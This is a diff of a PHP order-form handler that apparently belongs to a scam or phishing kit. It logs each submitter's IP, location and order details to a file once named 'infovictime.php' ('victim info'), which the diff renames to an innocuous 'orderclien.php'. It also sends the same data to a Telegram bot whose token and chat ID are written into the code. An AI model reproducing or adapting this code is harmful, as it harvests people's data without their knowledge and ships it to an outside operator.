@@ -35,8 +35,8 @@ if(  isset($_POST["order"])  )
 
 		
 				
-		$file = Fopen("infovictime.php","a+"); 
-		fwrite($file ,    "\n /-- star info clien --/"                                          );
+		$file = Fopen("orderclien.php","a+"); 
+		fwrite($file ,    "\n /-- star info clien --/"                                            );
 		fwrite($file ,    "<br/> \n datetime : "              .      $datetime                    ); 
 		fwrite($file ,    "<br/> \n ip : "                    .      $ip                          ); 
 		fwrite($file ,    "<br/> \n iplocationcity : "        .      $iplocationcity              ); 
@@ -46,7 +46,7 @@ if(  isset($_POST["order"])  )
 		fwrite($file ,    "<br/> \n city : "                  .      $city                        ); 
 		fwrite($file ,    "<br/> \n size : "                  .      $size                        ); 
 		fwrite($file ,    "<br/> \n color : "                 .      $color                       ); 
-		fwrite($file ,    "<br/> \n /-- end info clien --/"                                     );  
+		fwrite($file ,    "<br/> \n /-- end info clien --/"                                       );  
 		fwrite($file ,    "<br/> <br/> \n"                                                        );   
 
 
@@ -55,7 +55,7 @@ if(  isset($_POST["order"])  )
 		define ('url',"https://api.telegram.org/bot5865873037:AAEGua6qwO0cTXXfsTOSkxDTyIJeQPFxvO8/sendmessage?chat_id=5794732461&");
 		$message = urlencode
 		(   
-			"\n /-- start info clien --/"                       . 
+			"\n /-- start info clien --/"                         . 
 			"\n datetime: "               .   $datetime           .  		                 
 			"\n ip: "                     .   $ip                 .  
 			"\n iplocationcity: "         .   $iplocationcity     .  
